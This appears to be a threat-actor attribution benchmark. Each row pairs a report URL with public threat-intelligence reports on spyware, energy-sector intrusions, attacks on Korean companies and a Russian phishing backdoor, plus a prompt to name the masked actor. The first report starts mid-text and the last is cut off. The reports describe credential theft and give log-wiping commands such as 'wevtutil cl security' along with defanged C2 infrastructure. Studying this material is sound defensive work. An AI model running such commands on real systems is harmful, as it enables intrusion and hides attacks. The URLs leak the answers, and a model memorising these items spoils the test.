LinkedIn profile.    SunBird looks to have been created by Indian developers who also produced another commercial spyware product, which we dubbed BuzzOut. 7 The theory that SunBird’s roots lay in stalkerware was also supported by the content found in the exfiltrated data we uncovered. The data included information on stalkerware victims, as well as Pakistani nationals living in Pakistan and traveling in the UAE and India. This data suggests that SunBird could have been sold to an actor that selectively deployed it to gather intelligence on targeted individuals. Similar behavior was observed with Stealth Mango and Tangelo, two nation state mobile surveillanceware Lookout researchers discovered in 2018. 8    ‍    Exfiltrated data  During this investigation, we were able to access exfiltrated data for SunBird whose C2 infrastructure had been insufficiently secured.    ‍      This is a breakdown of types of data SunBird exfiltrated. This data is from publicly-accessible exfiltrated content exposed on SunBird C2 servers for 5 campaigns between 2018 and 2019. We found another 12 GB of data exfiltrated on another C2 server 23.82.19[.]250. The default language of this server was set up as Chinese when discovered by Lookout researchers. This may be a false flag or may have been altered by a third party. This also makes it difficult to confirm if all of the data originated from infections of actual target devices.  ‍      Frequency of infected devices’ locale and country code settings (translated to languages and countries) as packaged within publicly-accessible exfiltrated data. This data includes both the [PLACEHOLDER] APT targets and spouseware victims of SunBird.  ‍      Left:One particular SunBird C2 server was found to also be exposing a log file containing IP addresses of those that logged into the administrator panel. The majority of these were distributed throughout India. Right: Geo-location data captured from a publicly-exposed database found on another Sunbird C2 IP 23.82.19[.]250. Almost all data stored on this server referenced phone numbers of various locations in northern India. The second most common region for phone numbers was Pakistan.  ‍    Within the exfiltrated data, one particular victim caught our interest. This individual was using WhatsApp to correspond with someone applying for a position at the Pakistan Nuclear Regulatory Authority in 2017. In 2018, messages were uncovered from someone applying for a position at the Pakistan Atomic Energy Commission.9    Additional exfiltrated data from late 2018 and early 2019 indicated that SunBird was being used to monitor Booth Level Officers10 responsible for field-level information regarding electoral rolls in the Pulwama district of Kashmir. This time and location is significant as Pulwama suffered a suicide bombing attack in February 2019, which increased tensions between India and Pakistan. The start date of active monitoring of this target on C2 servers coincided with the start of the Indian general elections held in April 2019.    ‍      Continuous data exfiltration data that occurred every ten minutes stopped at the end of 2018. Aside from one brief upload in January 2019, it suddenly picked up again on the 11th of April 2019. While this may be coincidence, this is also the same day that the Indian general elections of 2019 began.12  ‍    ‍    A total of 156 victims were discovered in this new dataset and included phone numbers from India, Pakistan and Kazakhstan.    ‍    [PLACEHOLDER] connection  ‍      Hornbill application icons impersonate various chat and system applications.  ‍    Similar to previous [PLACEHOLDER] tactics seen with ChatSpy, Hornbill samples often impersonate chat applications such as Fruit Chat, Cucu Chat and Kako Chat. The related C2 infrastructure communicates on port 8080, a pattern also seen on the desktop campaigns carried out by [PLACEHOLDER].14    The [PLACEHOLDER] group is well known for impersonating legitimate services to cover their tracks and confuse its victims. Naming malicious apps similar to legitimate ones may be an attempt to gain a target’s trust. For example, “kako chat” may have been named due to its similarity to KakaoTalk.15 However, Kako Chat’s C2 server (chatk.goldenbirdcoin[.]com) references a defunct cryptocurrency by the same name.16 Cucu Chat may refer to a seemingly benign dating app of the same name that is available on third-party app stores such as APKPure.17, 18 However, Cucu Chat communicates to the site http://wangu[.]xyz19 (also on port 8080) and itself appears to be an impersonation of Wangu, an application which advertises itself as a chat app for Zimbabweans.20 The latest sample of Hornbill titled “Filos” trojanizes the Mesibo21 Android application for legitimate chat functionality.    During our investigation, we noticed that Hornbill C2 infrastructure hosted HTML resources consistent with a commercial spyware page, but missing its image resources.    ‍      C2 servers for Hornbill were found to host HTML content from a commercial spyware.                    Additionally, Hornbill carries out data exfiltration via the following unique set of server paths:    ‍      ‍    We found that the patterns noted above also existed on another domain samaatv[.]online. Although Lookout has not directly observed an APK communicating to this domain, we think one likely exists. samaatv[.]online has resolved to the IP address 91.210.107[.]104 since May 2019, which encompasses the activity of this campaign.    In addition to this, we found the SunBird C2 domain pieupdate[.]online resolved to 91.210.107.111 in between February 2019 and July 2019. This is also the timeframe in which we observed active campaigns by SunBird on that infrastructure.    With the help of public reporting and Lookout’s dataset, we are confident that the [PLACEHOLDER] APT group is actively using the IPs between 91.210.107[.]103-91.210.107[.]112 to host a large portion of their infrastructure, both presently and in the past.    Additional open-source intelligence (OSINT) searches confirmed the above connections. We found a publicly-accessible 2018 Pakistani government advisory warning of a desktop malware campaign targeting officers and government staff. The campaign described in it used phishing emails that impersonated various government agencies to deliver malicious Microsoft Word exploits. The Indicators of Compromise (IOCs) for this campaign included domains that were known [PLACEHOLDER] infrastructure, leading us to believe the entire campaign could be attributed to that group.                         Official Report from Pakistan’s Federal Bureau of Revenue on Malicious Activity.  ‍    A particular point of interest on the advisory IoC list, and crucial in confirming [PLACEHOLDER] connections, was pieupdate[.]online, a C2 server for malicious desktop activity as well as SunBird mobile malware.    ‍      Hornbill malware has unique file paths with which to communicate with C2 servers. They also display a unique Spyware HTML page. Lookout researchers uncovered another domain, samaatv[.]online, which shares the same unique file paths and Spyware HTML page found on a Hornbill C2 server, cucuchat[.]com. It is tied to known [PLACEHOLDER] infrastructure by resolving to 91.210.107[.]104, in the [PLACEHOLDER] IP range.  ‍    We are confident SunBird and Hornbill are two tools used by the same actor, perhaps for different surveillance purposes.    To the best of our knowledge the apps described in this article were never distributed through Google Play. Users of Lookout security apps are protected from these threats.    Lookout Threat Advisory Services customers have already been notified with additional intelligence on this and other threats. Take a look at our Threat Advisory Services page to learn more.
https://symantec-enterprise-blogs.security.com/threat-intelligence/dragonfly-energy-sector-cyber-attacks	The energy sector in Europe and North America is being targeted by a new wave of cyber attacks that could provide attackers with the means to severely disrupt affected operations. The group behind these attacks is known as [PLACEHOLDER]. The group has been in operation since at least 2011 but has re-emerged over the past two years from a quiet period following exposure by Symantec and a number of other researchers in 2014. This “[PLACEHOLDER] 2.0” campaign, which appears to have begun in late 2015, shares tactics and tools used in earlier campaigns by the group.    The energy sector has become an area of increased interest to cyber attackers over the past two years. Most notably, disruptions to Ukraine’s power system in 2015 and 2016 were attributed to a cyber attack and led to power outages affecting hundreds of thousands of people. In recent months, there have also been media reports of attempted attacks on the electricity grids in some European countries, as well as reports of companies that manage nuclear facilities in the U.S. being compromised by hackers.    The [PLACEHOLDER] group appears to be interested in both learning how energy facilities operate and also gaining access to operational systems themselves, to the extent that the group now potentially has the ability to sabotage or gain control of these systems should it decide to do so. Symantec customers are protected against the activities of the [PLACEHOLDER] group.    Figure 1. An outline of the [PLACEHOLDER] group's activities in its most recent campaign  [PLACEHOLDER] 2.0  Symantec has evidence indicating that the [PLACEHOLDER] 2.0 campaign has been underway since at least December 2015 and has identified a distinct increase in activity in 2017.    Symantec has strong indications of attacker activity in organizations in the U.S., Turkey, and Switzerland, with traces of activity in organizations outside of these countries. The U.S. and Turkey were also among the countries targeted by [PLACEHOLDER] in its earlier campaign, though the focus on organizations in Turkey does appear to have increased dramatically in this more recent campaign.    As it did in its prior campaign between 2011 and 2014, [PLACEHOLDER] 2.0 uses a variety of infection vectors in an effort to gain access to a victim’s network, including malicious emails, watering hole attacks, and Trojanized software.    The earliest activity identified by Symantec in this renewed campaign was a malicious email campaign that sent emails disguised as an invitation to a New Year’s Eve party to targets in the energy sector in December 2015.    The group conducted further targeted malicious email campaigns during 2016 and into 2017. The emails contained very specific content related to the energy sector, as well as some related to general business concerns. Once opened, the attached malicious document would attempt to leak victims’ network credentials to a server outside of the targeted organization.    In July, Cisco blogged about email-based attacks targeting the energy sector using a toolkit called Phishery. Some of the emails sent in 2017 that were observed by Symantec were also using the Phishery toolkit (Trojan.Phisherly), to steal victims’ credentials via a template injection attack. This toolkit became generally available on GitHub in late 2016,    As well as sending malicious emails, the attackers also used watering hole attacks to harvest network credentials, by compromising websites that were likely to be visited by those involved in the energy sector.    The stolen credentials were then used in follow-up attacks against the target organizations. In one instance, after a victim visited one of the compromised servers, Backdoor.Goodor was installed on their machine via PowerShell 11 days later. Backdoor.Goodor provides the attackers with remote access to the victim’s machine.    In 2014, Symantec observed the [PLACEHOLDER] group compromise legitimate software in order to deliver malware to victims, a practice also employed in the earlier 2011 campaigns. In the 2016 and 2017 campaigns the group is using the evasion framework Shellter in order to develop Trojanized applications. In particular, Backdoor.Dorshel was delivered as a trojanized version of standard Windows applications.    Symantec also has evidence to suggest that files masquerading as Flash updates may be used to install malicious backdoors onto target networks—perhaps by using social engineering to convince a victim they needed to download an update for their Flash player. Shortly after visiting specific URLs, a file named “install_flash_player.exe” was seen on victim computers, followed shortly by the Trojan.Karagany.B backdoor.    Typically, the attackers will install one or two backdoors onto victim computers to give them remote access and allow them to install additional tools if necessary. Goodor, Karagany.B, and Dorshel are examples of backdoors used, along with Trojan.Heriplor.    "Western energy sector at risk from ongoing cyber attacks, with potential for sabotage #[PLACEHOLDER]"  CLICK TO TWEET  Strong links with earlier campaigns  There are a number of indicators linking recent activity with earlier [PLACEHOLDER] campaigns. In particular, the Heriplor and Karagany Trojans used in [PLACEHOLDER] 2.0 were both also used in the earlier [PLACEHOLDER] campaigns between 2011 and 2014.    Trojan.Heriplor is a backdoor that appears to be exclusively used by [PLACEHOLDER], and is one of the strongest indications that the group that targeted the western energy sector between 2011 and 2014 is the same group that is behind the more recent attacks. This custom malware is not available on the black market, and has not been observed being used by any other known attack groups. It has only ever been seen being used in attacks against targets in the energy sector.    Trojan.Karagany.B is an evolution of Trojan.Karagany, which was previously used by [PLACEHOLDER], and there are similarities in the commands, encryption, and code routines used by the two Trojans. Trojan.Karagny.B doesn’t appear to be widely available, and has been consistently observed being used in attacks against the energy sector. However, the earlier Trojan.Karagany was leaked on underground markets, so its use by [PLACEHOLDER] is not necessarily exclusive.    Figure 2. Links between current and earlier [PLACEHOLDER] cyber attack campaigns  Figure 2. Links between current and earlier [PLACEHOLDER] cyber attack campaigns  Potential for sabotage  Sabotage attacks are typically preceded by an intelligence-gathering phase where attackers collect information about target networks and systems and acquire credentials that will be used in later campaigns. The most notable examples of this are Stuxnet and Shamoon, where previously stolen credentials were subsequently used to administer their destructive payloads.    The original [PLACEHOLDER] campaigns now appear to have been a more exploratory phase where the attackers were simply trying to gain access to the networks of targeted organizations. The [PLACEHOLDER] 2.0 campaigns show how the attackers may be entering into a new phase, with recent campaigns potentially providing them with access to operational systems, access that could be used for more disruptive purposes in future.    The most concerning evidence of this is in their use of screen captures. In one particular instance the attackers used a clear format for naming the screen capture files, [machine description and location].[organization name]. The string “cntrl” (control) is used in many of the machine descriptions, possibly indicating that these machines have access to operational systems.     "Numerous organizations breached in six-year campaign against the energy sector #[PLACEHOLDER]"  CLICK TO TWEET  Clues or false flags?  While Symantec cannot definitively determine [PLACEHOLDER]’s origins, this is clearly an accomplished attack group. It is capable of compromising targeted organizations through a variety of methods; can steal credentials to traverse targeted networks; and has a range of malware tools available to it, some of which appear to have been custom developed. [PLACEHOLDER] is a highly focused group, carrying out targeted attacks on energy sector targets since at least 2011, with a renewed ramping up of activity observed in the last year.    Some of the group’s activity appears to be aimed at making it more difficult to determine who precisely is behind it:    The attackers used more generally available malware and “living off the land” tools, such as administration tools like PowerShell, PsExec, and Bitsadmin, which may be part of a strategy to make attribution more difficult. The Phishery toolkit became available on Github in 2016, and a tool used by the group—Screenutil—also appears to use some code from CodeProject.  The attackers also did not use any zero days. As with the group’s use of publicly available tools, this could be an attempt to deliberately thwart attribution, or it could indicate a lack of resources.  Some code strings in the malware were in Russian. However, some were also in French, which indicates that one of these languages may be a false flag.  Conflicting evidence and what appear to be attempts at misattribution make it difficult to definitively state where this attack group is based or who is behind it.    What is clear is that [PLACEHOLDER] is a highly experienced threat actor, capable of compromising numerous organizations, stealing information, and gaining access to key systems. What it plans to do with all this intelligence has yet to become clear, but its capabilities do extend to materially disrupting targeted organizations should it choose to do so.    Protection  Symantec customers are protected against [PLACEHOLDER] activity, Symantec has also made efforts to notify identified targets of recent [PLACEHOLDER] activity.    Symantec has the following specific detections in place for the threats called out in this blog:    Trojan.Phisherly  Backdoor.Goodor  Trojan.Karagany.B  Backdoor.Dorshel  Trojan.Heriplor  Trojan.Listrix  Trojan.Karagany  Symantec has also developed a list of Indicators of Compromise to assist in identifying [PLACEHOLDER] activity:    Figure.3 Indicators of Compromise to assist in identifying [PLACEHOLDER] activity  Figure.3 Indicators of Compromise to assist in identifying [PLACEHOLDER] activity  Customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have previously received reporting on the [PLACEHOLDER] 2.0 group, which included methods of detecting and thwarting the activities of this adversary.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The energy sector in Europe and North America is being targeted by a new wave of cyber attacks that could provide attackers with the means to severely disrupt affected operations. The group behind these attacks is known as [PLACEHOLDER]. The group has been in operation since at least 2011 but has re-emerged over the past two years from a quiet period following exposure by Symantec and a number of other researchers in 2014. This “[PLACEHOLDER] 2.0” campaign, which appears to have begun in late 2015, shares tactics and tools used in earlier campaigns by the group.    The energy sector has become an area of increased interest to cyber attackers over the past two years. Most notably, disruptions to Ukraine’s power system in 2015 and 2016 were attributed to a cyber attack and led to power outages affecting hundreds of thousands of people. In recent months, there have also been media reports of attempted attacks on the electricity grids in some European countries, as well as reports of companies that manage nuclear facilities in the U.S. being compromised by hackers.    The [PLACEHOLDER] group appears to be interested in both learning how energy facilities operate and also gaining access to operational systems themselves, to the extent that the group now potentially has the ability to sabotage or gain control of these systems should it decide to do so. Symantec customers are protected against the activities of the [PLACEHOLDER] group.    Figure 1. An outline of the [PLACEHOLDER] group's activities in its most recent campaign  [PLACEHOLDER] 2.0  Symantec has evidence indicating that the [PLACEHOLDER] 2.0 campaign has been underway since at least December 2015 and has identified a distinct increase in activity in 2017.    Symantec has strong indications of attacker activity in organizations in the U.S., Turkey, and Switzerland, with traces of activity in organizations outside of these countries. The U.S. and Turkey were also among the countries targeted by [PLACEHOLDER] in its earlier campaign, though the focus on organizations in Turkey does appear to have increased dramatically in this more recent campaign.    As it did in its prior campaign between 2011 and 2014, [PLACEHOLDER] 2.0 uses a variety of infection vectors in an effort to gain access to a victim’s network, including malicious emails, watering hole attacks, and Trojanized software.    The earliest activity identified by Symantec in this renewed campaign was a malicious email campaign that sent emails disguised as an invitation to a New Year’s Eve party to targets in the energy sector in December 2015.    The group conducted further targeted malicious email campaigns during 2016 and into 2017. The emails contained very specific content related to the energy sector, as well as some related to general business concerns. Once opened, the attached malicious document would attempt to leak victims’ network credentials to a server outside of the targeted organization.    In July, Cisco blogged about email-based attacks targeting the energy sector using a toolkit called Phishery. Some of the emails sent in 2017 that were observed by Symantec were also using the Phishery toolkit (Trojan.Phisherly), to steal victims’ credentials via a template injection attack. This toolkit became generally available on GitHub in late 2016,    As well as sending malicious emails, the attackers also used watering hole attacks to harvest network credentials, by compromising websites that were likely to be visited by those involved in the energy sector.    The stolen credentials were then used in follow-up attacks against the target organizations. In one instance, after a victim visited one of the compromised servers, Backdoor.Goodor was installed on their machine via PowerShell 11 days later. Backdoor.Goodor provides the attackers with remote access to the victim’s machine.    In 2014, Symantec observed the [PLACEHOLDER] group compromise legitimate software in order to deliver malware to victims, a practice also employed in the earlier 2011 campaigns. In the 2016 and 2017 campaigns the group is using the evasion framework Shellter in order to develop Trojanized applications. In particular, Backdoor.Dorshel was delivered as a trojanized version of standard Windows applications.    Symantec also has evidence to suggest that files masquerading as Flash updates may be used to install malicious backdoors onto target networks—perhaps by using social engineering to convince a victim they needed to download an update for their Flash player. Shortly after visiting specific URLs, a file named “install_flash_player.exe” was seen on victim computers, followed shortly by the Trojan.Karagany.B backdoor.    Typically, the attackers will install one or two backdoors onto victim computers to give them remote access and allow them to install additional tools if necessary. Goodor, Karagany.B, and Dorshel are examples of backdoors used, along with Trojan.Heriplor.    "Western energy sector at risk from ongoing cyber attacks, with potential for sabotage #[PLACEHOLDER]"  CLICK TO TWEET  Strong links with earlier campaigns  There are a number of indicators linking recent activity with earlier [PLACEHOLDER] campaigns. In particular, the Heriplor and Karagany Trojans used in [PLACEHOLDER] 2.0 were both also used in the earlier [PLACEHOLDER] campaigns between 2011 and 2014.    Trojan.Heriplor is a backdoor that appears to be exclusively used by [PLACEHOLDER], and is one of the strongest indications that the group that targeted the western energy sector between 2011 and 2014 is the same group that is behind the more recent attacks. This custom malware is not available on the black market, and has not been observed being used by any other known attack groups. It has only ever been seen being used in attacks against targets in the energy sector.    Trojan.Karagany.B is an evolution of Trojan.Karagany, which was previously used by [PLACEHOLDER], and there are similarities in the commands, encryption, and code routines used by the two Trojans. Trojan.Karagny.B doesn’t appear to be widely available, and has been consistently observed being used in attacks against the energy sector. However, the earlier Trojan.Karagany was leaked on underground markets, so its use by [PLACEHOLDER] is not necessarily exclusive.    Figure 2. Links between current and earlier [PLACEHOLDER] cyber attack campaigns  Figure 2. Links between current and earlier [PLACEHOLDER] cyber attack campaigns  Potential for sabotage  Sabotage attacks are typically preceded by an intelligence-gathering phase where attackers collect information about target networks and systems and acquire credentials that will be used in later campaigns. The most notable examples of this are Stuxnet and Shamoon, where previously stolen credentials were subsequently used to administer their destructive payloads.    The original [PLACEHOLDER] campaigns now appear to have been a more exploratory phase where the attackers were simply trying to gain access to the networks of targeted organizations. The [PLACEHOLDER] 2.0 campaigns show how the attackers may be entering into a new phase, with recent campaigns potentially providing them with access to operational systems, access that could be used for more disruptive purposes in future.    The most concerning evidence of this is in their use of screen captures. In one particular instance the attackers used a clear format for naming the screen capture files, [machine description and location].[organization name]. The string “cntrl” (control) is used in many of the machine descriptions, possibly indicating that these machines have access to operational systems.     "Numerous organizations breached in six-year campaign against the energy sector #[PLACEHOLDER]"  CLICK TO TWEET  Clues or false flags?  While Symantec cannot definitively determine [PLACEHOLDER]’s origins, this is clearly an accomplished attack group. It is capable of compromising targeted organizations through a variety of methods; can steal credentials to traverse targeted networks; and has a range of malware tools available to it, some of which appear to have been custom developed. [PLACEHOLDER] is a highly focused group, carrying out targeted attacks on energy sector targets since at least 2011, with a renewed ramping up of activity observed in the last year.    Some of the group’s activity appears to be aimed at making it more difficult to determine who precisely is behind it:    The attackers used more generally available malware and “living off the land” tools, such as administration tools like PowerShell, PsExec, and Bitsadmin, which may be part of a strategy to make attribution more difficult. The Phishery toolkit became available on Github in 2016, and a tool used by the group—Screenutil—also appears to use some code from CodeProject.  The attackers also did not use any zero days. As with the group’s use of publicly available tools, this could be an attempt to deliberately thwart attribution, or it could indicate a lack of resources.  Some code strings in the malware were in Russian. However, some were also in French, which indicates that one of these languages may be a false flag.  Conflicting evidence and what appear to be attempts at misattribution make it difficult to definitively state where this attack group is based or who is behind it.    What is clear is that [PLACEHOLDER] is a highly experienced threat actor, capable of compromising numerous organizations, stealing information, and gaining access to key systems. What it plans to do with all this intelligence has yet to become clear, but its capabilities do extend to materially disrupting targeted organizations should it choose to do so.    Protection  Symantec customers are protected against [PLACEHOLDER] activity, Symantec has also made efforts to notify identified targets of recent [PLACEHOLDER] activity.    Symantec has the following specific detections in place for the threats called out in this blog:    Trojan.Phisherly  Backdoor.Goodor  Trojan.Karagany.B  Backdoor.Dorshel  Trojan.Heriplor  Trojan.Listrix  Trojan.Karagany  Symantec has also developed a list of Indicators of Compromise to assist in identifying [PLACEHOLDER] activity:    Figure.3 Indicators of Compromise to assist in identifying [PLACEHOLDER] activity  Figure.3 Indicators of Compromise to assist in identifying [PLACEHOLDER] activity  Customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have previously received reporting on the [PLACEHOLDER] 2.0 group, which included methods of detecting and thwarting the activities of this adversary.
https://asec.ahnlab.com/en/63192/	AhnLab SEcurity intelligence Center (ASEC) recently discovered the [PLACEHOLDER] group’s continuous attacks on Korean companies. It is notable that installations of MeshAgent were found in some cases. Threat actors often exploit MeshAgent along with other similar remote management tools because it offers diverse remote control features.    The [PLACEHOLDER] group exploited Korean asset management solutions to install malware such as [PLACEHOLDER] and ModeLoader, which are the malware used in the previous cases. Starting with Innorix Agent in the past, the group has been continually exploiting Korean asset management solutions to distribute their malware during the lateral movement phase [1] [2].    1. [PLACEHOLDER]    The ASEC team previously introduced [PLACEHOLDER] in the past blog article, “Analysis of [PLACEHOLDER]’s New Attack Activities” [3]. [PLACEHOLDER] looks similar to Andardoor found in attack cases that exploited Innorix Agent, but unlike Andardoor which has most of the backdoor features (executing commands received from the C&C server) implemented in binary, [PLACEHOLDER] is a downloader that downloads executable data such as .NET assembly and runs it in the memory.    Command Feature  alibaba Run downloaded .NET assembly  facebook Run downloaded .NET method  exit Terminate  vanish Self-delete and terminate  Table 1. [PLACEHOLDER]’s command list    Unlike the previous type that was obfuscated using Dotfuscator tool, [PLACEHOLDER] found this time was obfuscated using KoiVM. As strings for use are decrypted during the execution phase, strings identical to the ones in the past [PLACEHOLDER] can be found. Note that the current [PLACEHOLDER] uses the “sslClient” string when connecting with the C&C server like the [PLACEHOLDER] found in previous attacks.      Figure 1. [PLACEHOLDER] obfuscated with KoiVM  2. MeshAgent    MeshAgent can collect basic system information required for remote management and provides features such as power and account management, chat or message pop-up, file upload and download, and command execution. It also provides web-based remote desktop features such as RDP and VNC. Users typically use this tool to use and manage their systems remotely, but these are features good for the threat actors to abuse.    There have been actual cases in which threat actors used MeshAgent to remotely control their victims’ screens [4]. This is the first time the [PLACEHOLDER] group used MeshAgent, and it was downloaded from the external source with the name “fav.ico”.      Figure 2. Logs of MeshAgent installation    Figure 3. Behavior logs of MeshAgent discovered by AhnLab’s ASD infrastructure  The malware was not collected, but the team found the following C&C server as the MeshAgent server was active at the time.      Figure 4. The C&C server of MeshAgent  3. ModeLoader    ModeLoader is a JavaScript malware that the [PLACEHOLDER] group has been using for a long time. Instead of being generated as a file, it is downloaded externally via Mshta and executed. One of our previous blog posted the behavior listed on an ASD log.      Figure 5. ModeLoader found in a past case  The threat actors mainly exploit asset management solutions to execute Mshta command that downloads ModeLoader. When the following command is run, ModeLoader is downloaded and executed via the Mshta process C&C, and it regularly attempts to establish communication with the C&C server.      Figure 6. ModeLoader installation command discovered by AhnLab’s ASD infrastructure  ModeLoader is developed in JavaScript and obfuscated, but it provides a simple feature. It regularly connects to the C&C server (modeRead.php), receives Base64-encoded commands, executes them, and sends the results to the C&C server (modeWrite.php).      Figure 7. ModeLoader that receives commands from the C&C server  The threat actors appeared to have used ModeLoader to install additional malware from the outside. Using the command below, [PLACEHOLDER] was installed as “SVPNClientW.exe” in %SystemDirectory% and executed.    > cmd.exe /c tasklist  > cmd.exe /c c:\windows\system32\SVPN*    4. Other Malware Attack Cases    After using a backdoor such as [PLACEHOLDER] and ModeLoader to take control of the infected systems, the threat actors installed Mimikatz and attempted to steal the credentials inside the systems. Since plain passwords that use the WDigest security package cannot be found in the latest Windows environment, the command that sets the UseLogonCredential registry key is found simultaneously. The threat actors also used [PLACEHOLDER] to execute the “wevtutil cl security” command and delete security event logs of the infected systems.    The shared characteristic of the attacks that belong to the attack campaign found this time is that they are found along with a keylogger.  The malware provides not only the keylogging feature but also clipboard logging, and it records the keylogged data and data copied to the clipboard in “C:\Users\Public\game.db.”      Figure 8. Keylogger used in the attacks  The [PLACEHOLDER] group installed a backdoor like how Kimsuky group did, took control of the infected systems, and performed additional tasks to remotely take control of their victims’ screens. To establish remote control, they installed MeshAgent as mentioned above, but also used RDP in some cases, and the command to activate the RDP service was also found. Although files were not found, the threat actors are likely using fRPC in their attacks in an attempt to access infected systems located in private networks via RDP.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: AhnLab SEcurity intelligence Center (ASEC) recently discovered the [PLACEHOLDER] group’s continuous attacks on Korean companies. It is notable that installations of MeshAgent were found in some cases. Threat actors often exploit MeshAgent along with other similar remote management tools because it offers diverse remote control features.    The [PLACEHOLDER] group exploited Korean asset management solutions to install malware such as [PLACEHOLDER] and ModeLoader, which are the malware used in the previous cases. Starting with Innorix Agent in the past, the group has been continually exploiting Korean asset management solutions to distribute their malware during the lateral movement phase [1] [2].    1. [PLACEHOLDER]    The ASEC team previously introduced [PLACEHOLDER] in the past blog article, “Analysis of [PLACEHOLDER]’s New Attack Activities” [3]. [PLACEHOLDER] looks similar to Andardoor found in attack cases that exploited Innorix Agent, but unlike Andardoor which has most of the backdoor features (executing commands received from the C&C server) implemented in binary, [PLACEHOLDER] is a downloader that downloads executable data such as .NET assembly and runs it in the memory.    Command Feature  alibaba Run downloaded .NET assembly  facebook Run downloaded .NET method  exit Terminate  vanish Self-delete and terminate  Table 1. [PLACEHOLDER]’s command list    Unlike the previous type that was obfuscated using Dotfuscator tool, [PLACEHOLDER] found this time was obfuscated using KoiVM. As strings for use are decrypted during the execution phase, strings identical to the ones in the past [PLACEHOLDER] can be found. Note that the current [PLACEHOLDER] uses the “sslClient” string when connecting with the C&C server like the [PLACEHOLDER] found in previous attacks.      Figure 1. [PLACEHOLDER] obfuscated with KoiVM  2. MeshAgent    MeshAgent can collect basic system information required for remote management and provides features such as power and account management, chat or message pop-up, file upload and download, and command execution. It also provides web-based remote desktop features such as RDP and VNC. Users typically use this tool to use and manage their systems remotely, but these are features good for the threat actors to abuse.    There have been actual cases in which threat actors used MeshAgent to remotely control their victims’ screens [4]. This is the first time the [PLACEHOLDER] group used MeshAgent, and it was downloaded from the external source with the name “fav.ico”.      Figure 2. Logs of MeshAgent installation    Figure 3. Behavior logs of MeshAgent discovered by AhnLab’s ASD infrastructure  The malware was not collected, but the team found the following C&C server as the MeshAgent server was active at the time.      Figure 4. The C&C server of MeshAgent  3. ModeLoader    ModeLoader is a JavaScript malware that the [PLACEHOLDER] group has been using for a long time. Instead of being generated as a file, it is downloaded externally via Mshta and executed. One of our previous blog posted the behavior listed on an ASD log.      Figure 5. ModeLoader found in a past case  The threat actors mainly exploit asset management solutions to execute Mshta command that downloads ModeLoader. When the following command is run, ModeLoader is downloaded and executed via the Mshta process C&C, and it regularly attempts to establish communication with the C&C server.      Figure 6. ModeLoader installation command discovered by AhnLab’s ASD infrastructure  ModeLoader is developed in JavaScript and obfuscated, but it provides a simple feature. It regularly connects to the C&C server (modeRead.php), receives Base64-encoded commands, executes them, and sends the results to the C&C server (modeWrite.php).      Figure 7. ModeLoader that receives commands from the C&C server  The threat actors appeared to have used ModeLoader to install additional malware from the outside. Using the command below, [PLACEHOLDER] was installed as “SVPNClientW.exe” in %SystemDirectory% and executed.    > cmd.exe /c tasklist  > cmd.exe /c c:\windows\system32\SVPN*    4. Other Malware Attack Cases    After using a backdoor such as [PLACEHOLDER] and ModeLoader to take control of the infected systems, the threat actors installed Mimikatz and attempted to steal the credentials inside the systems. Since plain passwords that use the WDigest security package cannot be found in the latest Windows environment, the command that sets the UseLogonCredential registry key is found simultaneously. The threat actors also used [PLACEHOLDER] to execute the “wevtutil cl security” command and delete security event logs of the infected systems.    The shared characteristic of the attacks that belong to the attack campaign found this time is that they are found along with a keylogger.  The malware provides not only the keylogging feature but also clipboard logging, and it records the keylogged data and data copied to the clipboard in “C:\Users\Public\game.db.”      Figure 8. Keylogger used in the attacks  The [PLACEHOLDER] group installed a backdoor like how Kimsuky group did, took control of the infected systems, and performed additional tasks to remotely take control of their victims’ screens. To establish remote control, they installed MeshAgent as mentioned above, but also used RDP in some cases, and the command to activate the RDP service was also found. Although files were not found, the threat actors are likely using fRPC in their attacks in an attempt to access infected systems located in private networks via RDP.
https://blog.google/threat-analysis-group/google-tag-coldriver-russian-phishing-malware/	Over the years, TAG has analyzed a range of persistent threats including [PLACEHOLDER], a Russian threat group focused on credential phishing activities against high profile individuals in NGOs, former intelligence and military officers, and NATO governments. For years, TAG has been countering and reporting on this group’s efforts to conduct espionage aligned with the interests of the Russian government. To add to the community’s understanding of [PLACEHOLDER] activity, we’re shining light on their extended capabilities which now includes the use of malware.    [PLACEHOLDER] continues its focus on credential phishing against Ukraine, NATO countries, academic institutions and NGOs. In order to gain the trust of targets, [PLACEHOLDER] often utilizes impersonation accounts, pretending to be an expert in a particular field or somehow affiliated with the target. The impersonation account is then used to establish a rapport with the target, increasing the likelihood of the phishing campaign's success, and eventually sends a phishing link or document containing a link. Recently published information on [PLACEHOLDER] highlights the group's evolving tactics, techniques and procedures (TTPs), to improve its detection evasion capabilities.    Recently, TAG has observed [PLACEHOLDER] continue this evolution by going beyond phishing for credentials, to delivering malware via campaigns using PDFs as lure documents. TAG has disrupted the following campaign by adding all known domains and hashes to Safe Browsing blocklists.    “Encrypted” lure-based malware delivery  As far back as November 2022, TAG has observed [PLACEHOLDER] sending targets benign PDF documents from impersonation accounts. [PLACEHOLDER] presents these documents as a new op-ed or other type of article that the impersonation account is looking to publish, asking for feedback from the target. When the user opens the benign PDF, the text appears encrypted.      If the target responds that they cannot read the encrypted document, the [PLACEHOLDER] impersonation account responds with a link, usually hosted on a cloud storage site, to a “decryption” utility for the target to use. This decryption utility, while also displaying a decoy document, is in fact a backdoor, tracked as SPICA, giving [PLACEHOLDER] access to the victim’s machine.    In 2015 and 2016, TAG observed [PLACEHOLDER] using the Scout implant that was leaked during the Hacking Team incident of July 2015. SPICA represents the first custom malware that we attribute being developed and used by [PLACEHOLDER].    SPICA backdoor  SPICA is written in Rust, and uses JSON over websockets for command and control (C2). It supports a number of commands including:    Executing arbitrary shell commands  Stealing cookies from Chrome, Firefox, Opera and Edge  Uploading and downloading files  Perusing the filesystem by listing the contents of it  Enumerating documents and exfiltrating them in an archive  There is also a command called “telegram,” but the functionality of this command is unclear  Once executed, SPICA decodes an embedded PDF, writes it to disk, and opens it as a decoy for the user. In the background, it 